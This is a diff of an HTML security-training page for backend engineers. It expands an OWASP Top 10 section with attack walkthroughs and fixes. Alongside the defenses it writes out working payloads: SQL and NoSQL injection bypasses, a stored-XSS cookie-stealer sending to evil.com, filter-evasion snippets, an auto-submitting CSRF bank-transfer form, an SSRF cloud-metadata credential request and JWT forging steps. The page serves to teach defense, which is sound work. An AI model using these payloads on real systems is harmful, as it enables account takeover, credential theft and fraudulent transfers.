@@ -85,52 +85,216 @@
         <label class="section-understood"><input type="checkbox"><span>Mark understood</span></label>
       </div>
       <div class="section-body">
-        <p>The OWASP Top 10 is a list of the most critical web application security risks. These aren't theoretical — they're what's actually being exploited in production systems. As a backend engineer you're responsible for preventing all of them in code you write.</p>
+        <p>The OWASP Top 10 is a list of the most critical web application security risks. These aren't theoretical — they're what's actually being exploited in production systems right now. Each vulnerability class below includes a real attack narrative, an exploit walkthrough, and concrete defense patterns. As a backend engineer, every line of code you ship is the last line of defense.</p>
 
         <h3>SQL Injection</h3>
-        <p>Attacker inserts SQL into an input field that gets concatenated into a query string. Classic example:</p>
-        <pre><code>// Vulnerable — never do this
+        <p><strong>The attack narrative.</strong> An attacker is probing your login form. They enter <code>admin'--</code> as the username and anything as the password. Your concatenated query becomes <code>SELECT * FROM users WHERE username = 'admin'--' AND password = '...'</code> — the double-dash comments out the password check entirely. They're now authenticated as admin without knowing the password.</p>
+        <pre><code>// Vulnerable — string interpolation, never do this
 const query = `SELECT * FROM users WHERE email = '${userInput}'`;
-// If userInput is: ' OR '1'='1
-// Query becomes: SELECT * FROM users WHERE email = '' OR '1'='1'
-// Returns all users
 
-// Safe — parameterized query
+// Classic bypass: userInput = ' OR '1'='1
+// Query becomes: SELECT * FROM users WHERE email = '' OR '1'='1'
+// Returns every row in the table
+
+// Authentication bypass: userInput = admin'--
+// Query becomes: SELECT * FROM users WHERE email = 'admin'--' AND password = '...'
+// Password check is commented out — attacker logs in as admin
+
+// Safe — parameterized query (database driver separates structure from data)
 const user = await db.query(
   'SELECT * FROM users WHERE email = $1',
   [userInput]
-)</code></pre>
-        <p>The fix is always parameterized queries (prepared statements). The database driver separates the query structure from the data — user input is never interpreted as SQL. ORMs use parameterized queries by default, but raw query escape-hatches can reintroduce the vulnerability. Never use string concatenation or interpolation to build queries.</p>
+);</code></pre>
+        <p><strong>Blind SQLi (boolean-based).</strong> Many injections return no visible data — the application just shows a generic error. Attackers use boolean-based blind injection to extract data one bit at a time. The query <code>1 AND SUBSTRING(password,1,1)='a'</code> returns differently depending on whether the first character of the password is 'a'. By iterating over characters and positions, the entire password hash is reconstructed — slowly but completely. Automated tools like sqlmap do this in minutes.</p>
+        <pre><code>-- Boolean-based blind injection probing the first char of a password hash
+-- Attacker sends these as separate requests and compares response sizes/times:
+SELECT * FROM users WHERE id = 1 AND SUBSTRING(password,1,1)='a'  -- different response
+SELECT * FROM users WHERE id = 1 AND SUBSTRING(password,1,1)='b'  -- different response
+-- ... iterates through all characters until the full hash is recovered</code></pre>
+        <p><strong>Second-order injection.</strong> The most insidious variant. User input is safely parameterized on write, stored in the database, and later retrieved and concatenated into a different query. The initial insert is safe; the second query is the vulnerability. Example: a username of <code>admin'--</code> is stored correctly. Later, a password-change feature retrieves the username and interpolates it into a raw SQL string without re-parameterizing.</p>
+        <p><strong>NoSQL injection.</strong> MongoDB is not immune. If you pass request body data directly into a query object, an attacker can send JSON operators instead of string values. Sending <code>{"password": {"$gt": ""}}</code> matches any password greater than an empty string — which is every password. This bypasses authentication entirely.</p>
+        <pre><code>// Vulnerable MongoDB — req.body.password passed directly as a query value
+const user = await User.findOne({
+  username: req.body.username,
+  password: req.body.password  // attacker sends: {"$gt": ""}
+});
+// Query becomes: { username: "admin", password: { $gt: "" } }
+// Matches the admin user regardless of actual password
+
+// Fixed — explicitly cast to string, or use a schema validator
+const user = await User.findOne({
+  username: String(req.body.username),
+  password: String(req.body.password)
+});</code></pre>
+        <p><strong>Defenses.</strong> Always use parameterized queries or prepared statements — the database driver then treats user input as pure data, never as executable SQL. ORMs use parameterization by default, but every ORM has raw query escape-hatches (<code>.query()</code>, <code>.raw()</code>, <code>Sequelize.literal()</code>) that bypass this protection. Never use them with user-supplied input. For NoSQL, validate and cast all query parameters explicitly; never spread <code>req.body</code> directly into a query object. Add a WAF as a secondary layer, but do not rely on it as the primary control.</p>
 
         <h3>Cross-Site Scripting (XSS)</h3>
-        <p>Attacker injects malicious script that executes in other users' browsers. <strong>Stored XSS</strong>: attacker stores <code>&lt;script&gt;document.cookie&lt;/script&gt;</code> in your database (comment field, profile name); your server renders it; every visitor's browser executes it. <strong>Reflected XSS</strong>: malicious script is in the URL; server reflects it back in the response.</p>
-        <p>Fix: escape HTML output (never render user input as raw HTML), use Content Security Policy (CSP) headers to restrict script sources, use the <code>HttpOnly</code> flag on cookies (prevents JavaScript from reading them). Modern framework templating (React, Vue, Angular) auto-escapes by default — only the explicit escape-hatches like <code>dangerouslySetInnerHTML</code> are dangerous. CSP header: <code>Content-Security-Policy: default-src 'self'; script-src 'self' cdn.example.com</code>.</p>
+        <p><strong>The attack narrative — British Airways (Magecart, 2018).</strong> Attackers injected 22 lines of JavaScript into British Airways' payment page. The script ran in every customer's browser, silently exfiltrated form field contents (name, address, card number, CVV) to an attacker-controlled server, and did so for 15 days. Around 500,000 customers were affected. The injected script was indistinguishable from legitimate page behavior — it ran with full DOM access because it executed in the same origin as the page. This is the real-world stakes of XSS.</p>
+        <p><strong>Stored XSS.</strong> Attacker submits a comment containing <code>&lt;script&gt;document.location='https://evil.com/steal?c='+document.cookie&lt;/script&gt;</code>. Your server stores it in the database. Every user who loads the page runs the script in their browser. Because the script is same-origin, it has full access to cookies, localStorage, the DOM, and can make authenticated API calls on behalf of the victim.</p>
+        <p><strong>Reflected XSS.</strong> The payload lives in a URL parameter: <code>https://yoursite.com/search?q=&lt;script&gt;...&lt;/script&gt;</code>. Your server reflects the parameter value into the HTML response without escaping. Attacker sends the crafted URL to the victim; victim clicks it; their browser executes the script. Often delivered via phishing email.</p>
+        <p><strong>DOM-based XSS.</strong> The server never sees the payload — it lives in the URL fragment (<code>#</code>) and is processed entirely by client-side JavaScript. No server-side sanitization can catch it. Example: your SPA reads <code>location.hash</code> and writes it into the DOM with <code>innerHTML</code>. Attacker sends <code>https://yoursite.com/#&lt;img src=x onerror=alert(1)&gt;</code>. The server returns the normal page; the client-side script injects the payload into the DOM.</p>
+        <pre><code>// Vulnerable — DOM-based XSS via innerHTML
+const searchTerm = location.hash.slice(1); // reads from URL fragment
+document.getElementById('results-heading').innerHTML =
+  'Results for: ' + searchTerm; // attacker controls searchTerm
+
+// Safe — use textContent instead of innerHTML for text content
+document.getElementById('results-heading').textContent =
+  'Results for: ' + searchTerm;
+
+// If you must insert HTML, use a sanitizer library
+import DOMPurify from 'dompurify';
+element.innerHTML = DOMPurify.sanitize(userInput);</code></pre>
+        <p><strong>Bypassing naive filters.</strong> Blocklist-based filters are reliably defeated. If you block <code>&lt;script&gt;</code>, attackers use event handlers: <code>&lt;img src=x onerror=alert(1)&gt;</code>. If you block <code>onerror</code>, they use <code>&lt;svg onload=alert(1)&gt;</code>. If you strip <code>javascript:</code>, they use <code>&#106;avascript:</code> (HTML entity encoding). Filter evasion is a solved problem for attackers. The correct approach is allowlist-based output encoding, not blocklist-based stripping.</p>
+        <p><strong>Defenses.</strong> (1) Escape all output: HTML-encode user-supplied content before rendering (<code>&amp;</code> → <code>&amp;amp;</code>, <code>&lt;</code> → <code>&amp;lt;</code>, etc.). Modern templating engines (React JSX, Angular, Jinja2) do this automatically — the unsafe escape-hatches are <code>dangerouslySetInnerHTML</code>, <code>[innerHTML]</code>, and <code>Markup()</code>. (2) Content Security Policy: <code>Content-Security-Policy: default-src 'self'; script-src 'self' cdn.example.com</code> tells browsers to refuse to execute scripts from any origin not on the allowlist. A strict CSP is the most effective defense against script injection. (3) <code>HttpOnly</code> cookies: prevents JavaScript from reading session cookies even if XSS executes. (4) Use DOMPurify for cases where you genuinely need to accept and render HTML (rich text editors).</p>
 
         <h3>Cross-Site Request Forgery (CSRF)</h3>
-        <p>Attacker tricks a logged-in user's browser into making a state-changing request to your server (a form submit or AJAX call). Because the browser sends cookies automatically, your server sees a valid session cookie and processes the malicious request.</p>
-        <p>Fix: <code>SameSite=Strict</code> or <code>SameSite=Lax</code> on session cookies (modern browsers won't send the cookie on cross-site requests), CSRF tokens (server generates a secret token per session, embeds it in forms, validates on POST), check the <code>Origin</code> header. For APIs using JWT in Authorization headers: CSRF is not an issue because browsers don't automatically add Authorization headers.</p>
+        <p><strong>The attack narrative.</strong> Your banking app uses cookie-based sessions. An attacker creates a webpage on <code>evil.com</code> that contains a hidden form targeting your bank's transfer endpoint. When a logged-in user visits <code>evil.com</code>, their browser automatically includes the bank's session cookie on the cross-site request, and the transfer goes through — without the user clicking anything.</p>
+        <p>Here is exactly what the attacker's HTML looks like:</p>
+        <pre><code>&lt;!-- Attacker hosts this on evil.com --&gt;
+&lt;html&gt;
+&lt;body onload="document.getElementById('csrf-form').submit()"&gt;
+  &lt;form id="csrf-form"
+        action="https://yourbank.com/api/transfer"
+        method="POST"
+        style="display:none"&gt;
+    &lt;input name="to_account" value="attacker_account_9999"&gt;
+    &lt;input name="amount" value="5000"&gt;
+  &lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+&lt;!-- Page loads → form auto-submits → bank sees valid session cookie → transfer executes --&gt;</code></pre>
+        <p><strong>Defense 1: SameSite cookies.</strong> <code>Set-Cookie: session=abc123; SameSite=Strict; HttpOnly; Secure</code>. With <code>SameSite=Strict</code>, the browser will not send the cookie on any cross-site request — the forged form submission above arrives with no session cookie and is rejected. <code>SameSite=Lax</code> is slightly more permissive (allows top-level navigations like clicking a link) but still blocks cross-site POST requests. This is now the primary CSRF defense for modern browsers. Set it on every session cookie.</p>
+        <p><strong>Defense 2: CSRF tokens.</strong> Server generates a cryptographically random token, stores it in the session, and embeds it in every form as a hidden field. On POST, the server validates the submitted token against the session-stored token. The attacker's forged form cannot include this token because they can't read your site's HTML (same-origin policy). The double-submit cookie pattern is a stateless variant: the token is also set as a cookie; the client must submit it as both a cookie and a form field; the server checks they match. This works because an attacker can't read or set cookies for your domain.</p>
+        <pre><code>// Server-side: generate and validate CSRF token
+app.get('/transfer-form', (req, res) => {
+  const csrfToken = crypto.randomBytes(32).toString('hex');
+  req.session.csrfToken = csrfToken;
+  res.render('transfer', { csrfToken }); // embedded in hidden form field
+});
 
-        <h3>Broken Authentication</h3>
-        <p>Includes: predictable session tokens (use cryptographically secure random tokens, at least 128 bits), session fixation (regenerate session ID after login), missing brute-force protection on login endpoints (rate limiting + account lockout), password storage mistakes (covered above), and missing session expiry (idle timeout + absolute timeout).</p>
+app.post('/api/transfer', (req, res) => {
+  if (req.body.csrfToken !== req.session.csrfToken) {
+    return res.status(403).json({ error: 'Invalid CSRF token' });
+  }
+  // process transfer
+});</code></pre>
+        <p><strong>Defense 3: Check the Origin header.</strong> For AJAX requests, reject any request where the <code>Origin</code> or <code>Referer</code> header doesn't match your domain. Browsers always send <code>Origin</code> on cross-origin requests and it cannot be forged by JavaScript. This is a good secondary control. Note: APIs using <code>Authorization: Bearer &lt;token&gt;</code> headers are not CSRF-vulnerable — browsers don't automatically attach Authorization headers on cross-origin requests.</p>
+
+        <h3>Broken Authentication &amp; JWT-Specific Attacks</h3>
+        <p><strong>Classic broken auth issues.</strong> Predictable session tokens (use <code>crypto.randomBytes(32)</code>, not sequential IDs or UUIDs v4 with low entropy sources); session fixation (regenerate the session ID immediately after login — an attacker who sets your session ID before login can reuse it after); missing brute-force protection on login (rate limit by IP and by account, add exponential backoff, consider CAPTCHA after N failures); password reset flaws (tokens that don't expire, tokens that are reusable, reset links sent to the wrong address).</p>
+        <p><strong>JWT algorithm confusion: the <code>alg:none</code> attack.</strong> The JWT spec originally allowed <code>"alg": "none"</code>, meaning no signature required. Some early JWT libraries accepted this. An attacker decodes the JWT (it's just base64), changes the payload claims (<code>"role": "admin"</code>), sets <code>"alg": "none"</code>, removes the signature, and submits it. A naive verifier accepts it. Fix: explicitly specify which algorithm(s) you accept in your verification code — never rely on the algorithm field in the token itself to determine how to verify it.</p>
+        <pre><code>// Vulnerable — algorithm taken from the token header
+jwt.verify(token, secret); // some libraries read alg from the token
+
+// Fixed — explicitly specify the algorithm
+jwt.verify(token, publicKey, { algorithms: ['RS256'] });
+// Only RS256 signatures are accepted; "alg:none" tokens are rejected</code></pre>
+        <p><strong>JWT algorithm confusion: RS256 → HS256.</strong> A more sophisticated attack. Your server uses RS256 (asymmetric): signs with a private key, verifies with a public key. The public key is publicly known. An attacker changes the token's <code>alg</code> header from <code>RS256</code> to <code>HS256</code> (symmetric HMAC) and signs the forged token using your public key as the HMAC secret. A library that trusts the algorithm from the token header will then attempt HMAC verification using the public key as the secret — and succeed. Fix: same as above — hardcode the expected algorithm in your verification call, never read it from the token.</p>
+        <p><strong>Timing attacks on token comparison.</strong> String comparison in most languages short-circuits: it returns false as soon as the first mismatched character is found. This means a comparison of <code>"abc"</code> vs <code>"abd"</code> takes slightly longer than <code>"abc"</code> vs <code>"xyz"</code> — the first two share a prefix. Over millions of requests, an attacker can statistically measure these timing differences and reconstruct a valid token one character at a time. Fix: always use constant-time comparison for secrets and tokens.</p>
+        <pre><code>// Vulnerable — short-circuit string comparison
+if (submittedToken === storedToken) { ... }
+
+// Fixed — constant-time comparison (Node.js)
+const crypto = require('crypto');
+if (!crypto.timingSafeEqual(
+  Buffer.from(submittedToken),
+  Buffer.from(storedToken)
+)) {
+  return res.status(401).json({ error: 'Invalid token' });
+}</code></pre>
 
         <h3>Insecure Direct Object References (IDOR)</h3>
-        <p>User can access another user's data by changing a numeric ID in the URL: <code>/api/invoices/12345</code> → change to <code>/api/invoices/12346</code>. If your server returns the invoice without checking that it belongs to the requesting user, that's IDOR. Fix: every authorization check must verify that the authenticated user is allowed to access the specific resource, not just that they're logged in.</p>
-        <pre><code>// Vulnerable
-const invoice = await Invoice.findById(req.params.id);
-res.json(invoice);
-
-// Fixed
-const invoice = await Invoice.findOne({
-  id: req.params.id,
-  owner_id: req.user.id  // enforce ownership
+        <p><strong>The attack narrative — Instagram (2012).</strong> A researcher discovered that Instagram's private photo delete endpoint accepted a photo ID with no ownership check. He could delete any user's photo by substituting the photo ID in the request. At Instagram's scale at the time, a script iterating through sequential IDs could have wiped arbitrary photos from any account. The bug was a textbook IDOR: the endpoint authenticated the user but never checked whether the resource belonged to them.</p>
+        <p><strong>The core mistake.</strong> Authentication (are you logged in?) and authorization (do you own this resource?) are different checks. Most IDOR bugs pass the first check and skip the second entirely.</p>
+        <pre><code>// Vulnerable — authenticates the user but doesn't check ownership
+app.get('/api/invoices/:id', authenticate, async (req, res) => {
+  const invoice = await Invoice.findById(req.params.id);
+  // Any authenticated user can read any invoice by guessing the ID
+  res.json(invoice);
 });
-if (!invoice) return res.status(404).json({ error: 'Not found' });</code></pre>
+
+// Fixed — ownership enforced in the query itself
+app.get('/api/invoices/:id', authenticate, async (req, res) => {
+  const invoice = await Invoice.findOne({
+    id: req.params.id,
+    owner_id: req.user.id  // constraint binds the resource to the requester
+  });
+  if (!invoice) return res.status(404).json({ error: 'Not found' });
+  // 404, not 403 — don't reveal whether the resource exists at all
+  res.json(invoice);
+});</code></pre>
+        <p><strong>UUIDs don't fix it.</strong> Switching from sequential integer IDs to UUIDs (e.g., <code>/api/invoices/a3f2c1d4-...</code>) makes IDs harder to guess, but this is security through obscurity. If the ID is ever exposed in a URL, an email, a log file, or another user's response, an attacker has it. The ownership check is the only reliable defense. UUIDs also prevent enumeration attacks (attackers can't iterate <code>12345, 12346, 12347...</code>), so they're still worth using — just don't mistake them for an authorization control.</p>
+        <p><strong>Testing systematically.</strong> Create two accounts (User A and User B). With User A, create a resource and note its ID. Log in as User B and attempt to access, modify, and delete User A's resource. Do this for every resource endpoint. Automated scanners miss IDOR because the vulnerability requires understanding business logic — only you know which resources should be scoped to which users. Include IDOR checks in code review checklists for every new endpoint.</p>
+
+        <h3>Server-Side Request Forgery (SSRF)</h3>
+        <p><strong>What it is.</strong> SSRF occurs when your server makes an HTTP request to a URL supplied (directly or indirectly) by the user, and an attacker supplies an internal URL instead of the intended external one. Your server, running inside the network perimeter, has access that external clients do not — internal services, admin interfaces, cloud provider metadata endpoints, and other resources protected only by network position.</p>
+        <p><strong>The cloud metadata attack.</strong> Every major cloud provider exposes an instance metadata service at a non-routable IP: <code>http://169.254.169.254/</code> on AWS, GCP, and Azure. This endpoint returns sensitive configuration data including IAM credentials. No authentication is required — only network proximity. If your server fetches a user-supplied URL without restriction, an attacker submits <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code> and receives temporary AWS access keys with whatever permissions the EC2 instance role has.</p>
+        <pre><code>// Vulnerable — your server fetches a URL the user controls
+app.post('/api/fetch-preview', async (req, res) => {
+  const { url } = req.body;
+  // Attacker sends: url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/my-role"
+  const response = await fetch(url); // your server makes the request from inside the network
+  const data = await response.json();
+  res.json(data); // returns AWS IAM credentials to the attacker
+});</code></pre>
+        <p><strong>Real incidents.</strong> The Capital One breach (2019) exploited SSRF via a misconfigured WAF to access the EC2 metadata endpoint and obtain IAM credentials, ultimately exfiltrating over 100 million customer records. Slack disclosed an SSRF vulnerability in 2021 where a webhook URL could be set to an internal address, allowing an attacker to probe internal services. SSRF is consistently underestimated because the vulnerable code looks like normal, reasonable functionality — fetching URLs is common in link preview features, webhook systems, and URL-based integrations.</p>
+        <p><strong>Defenses.</strong></p>
+        <ul>
+          <li><strong>Allowlist external URLs.</strong> If your use case is narrow (e.g., fetching Open Graph previews from a set of known domains), validate against an explicit allowlist of allowed hostnames. Reject anything else.</li>
+          <li><strong>Resolve and validate before fetching.</strong> DNS-resolve the hostname before making the request. Block requests to RFC 1918 private ranges (10.x.x.x, 172.16.x.x, 192.168.x.x), loopback (127.0.0.1), and link-local (169.254.x.x). Be aware of DNS rebinding attacks: the hostname resolves to a public IP during validation but resolves to an internal IP for the actual request. Re-validate after resolution.</li>
+          <li><strong>Use IMDSv2 on AWS.</strong> Instance Metadata Service version 2 requires a PUT request with a TTL header before the metadata endpoint responds. This prevents most SSRF exploits of the metadata service because the PUT step doesn't work through naive HTTP forwarding.</li>
+          <li><strong>Network-layer controls.</strong> Egress firewall rules that prevent your application servers from reaching internal services or the metadata IP. Defense in depth: even if SSRF exists in code, the network layer blocks the request.</li>
+        </ul>
 
         <h3>Security Misconfiguration</h3>
-        <p>The most common vulnerability category. Includes: default credentials not changed, debug endpoints accessible in production, verbose error messages exposing stack traces and internal paths, unnecessary services exposed, missing security headers. Checklist: remove debug/admin endpoints in production, disable directory listing, set security headers (X-Content-Type-Options, X-Frame-Options, Content-Security-Policy), restrict CORS to known origins, configure firewall rules.</p>
+        <p>Security misconfiguration is the most prevalent finding in real penetration tests — not because it's sophisticated, but because it requires no exploitation skill. The vulnerability is the configuration itself. Three high-impact examples:</p>
+        <p><strong>.env file exposure.</strong> A developer deploys an application with the <code>.env</code> file in a web-accessible directory. An attacker requests <code>https://yoursite.com/.env</code> and receives database passwords, API keys, JWT secrets, and OAuth credentials in plaintext. This is not hypothetical — automated scanners constantly probe for exposed <code>.env</code>, <code>.git</code>, and configuration files. Add <code>.env</code> to <code>.gitignore</code> and configure your web server to deny requests to dotfiles. Never put environment files in public directories.</p>
+        <p><strong>GraphQL introspection in production.</strong> GraphQL's introspection query lets any client ask the API for its complete schema: every type, every field, every query, and every mutation. This is invaluable during development. In production, it hands an attacker a full map of your API surface — undocumented internal mutations, admin-only operations, fields that reveal internal data models. Disable introspection in production environments. Most GraphQL server libraries have a single configuration flag for this.</p>
+        <pre><code>// Apollo Server — disable introspection in production
+const server = new ApolloServer({
+  typeDefs,
+  resolvers,
+  introspection: process.env.NODE_ENV !== 'production',
+});
+
+// Also consider field-level authorization — introspection disabled
+// doesn't protect against direct queries to privileged resolvers</code></pre>
+        <p><strong>Spring Boot Actuator endpoints.</strong> Spring Boot's Actuator module exposes management endpoints: <code>/actuator/health</code>, <code>/actuator/env</code>, <code>/actuator/beans</code>, <code>/actuator/heapdump</code>. The <code>/actuator/env</code> endpoint returns all environment variables including secrets. The <code>/actuator/heapdump</code> endpoint returns a full JVM heap dump — an attacker can extract secrets, session tokens, and database credentials from the heap dump offline. These endpoints must be secured or disabled in production. A misconfigured Spring Boot app with Actuator exposed to the internet is a critical finding.</p>
+        <p><strong>Broader misconfiguration checklist:</strong></p>
+        <ul>
+          <li>Default credentials on databases, admin panels, and third-party services — change them before the first deploy</li>
+          <li>Verbose error responses in production — stack traces reveal internal paths, library versions, and sometimes source code. Return generic errors to clients; log detail internally</li>
+          <li>CORS misconfiguration: <code>Access-Control-Allow-Origin: *</code> on authenticated endpoints, or reflecting the <code>Origin</code> header without validation, allows any website to make credentialed cross-origin requests</li>
+          <li>Unnecessary services and ports exposed: every open port is attack surface. Firewall everything except what's explicitly required</li>
+          <li>Missing security headers: run your site through securityheaders.com — it's a five-minute audit</li>
+          <li>S3 bucket or cloud storage public-read misconfiguration: a common cause of mass data exposure</li>
+        </ul>
 
         <h3>Mass Assignment</h3>
-        <p>User sends extra fields in a request body that the server blindly assigns to a model. Example: user sends <code>{"name": "Alice", "role": "admin"}</code> and your ORM updates all provided fields. Fix: explicitly whitelist which fields are allowed in updates. Never use <code>Object.assign(user, req.body)</code> or equivalent.</p>
+        <p><strong>The attack.</strong> Your user-update endpoint does <code>Object.assign(user, req.body)</code> or the ORM equivalent. A user sends <code>{"name": "Alice", "email": "alice@example.com", "role": "admin", "isVerified": true}</code>. Your server copies every field from the request body onto the user model and saves it. The attacker has just promoted themselves to admin and bypassed email verification in a single request.</p>
+        <pre><code>// Vulnerable — blind assignment from request body
+app.put('/api/users/:id', authenticate, async (req, res) => {
+  const user = await User.findById(req.params.id);
+  Object.assign(user, req.body); // all fields overwritten, including role, isAdmin, isVerified
+  await user.save();
+  res.json(user);
+});
+
+// Fixed — explicit allowlist of updatable fields
+const ALLOWED_USER_FIELDS = ['name', 'email', 'bio', 'avatarUrl'];
+
+app.put('/api/users/:id', authenticate, async (req, res) => {
+  const user = await User.findById(req.params.id);
+  for (const field of ALLOWED_USER_FIELDS) {
+    if (req.body[field] !== undefined) {
+      user[field] = req.body[field];
+    }
+  }
+  await user.save();
+  res.json(user);
+});</code></pre>
+        <p>Rails popularized this vulnerability with its <code>attr_accessible</code> / <code>strong_parameters</code> history — mass assignment was the root cause of a GitHub vulnerability in 2012 that allowed an attacker to push to any repository. The fix is always an explicit allowlist of which fields are permitted from user input. Apply this discipline to every endpoint that writes to a model: never pass <code>req.body</code> or request parameters directly to an ORM save or update method without filtering first.</p>
       </div>
     </div>
 
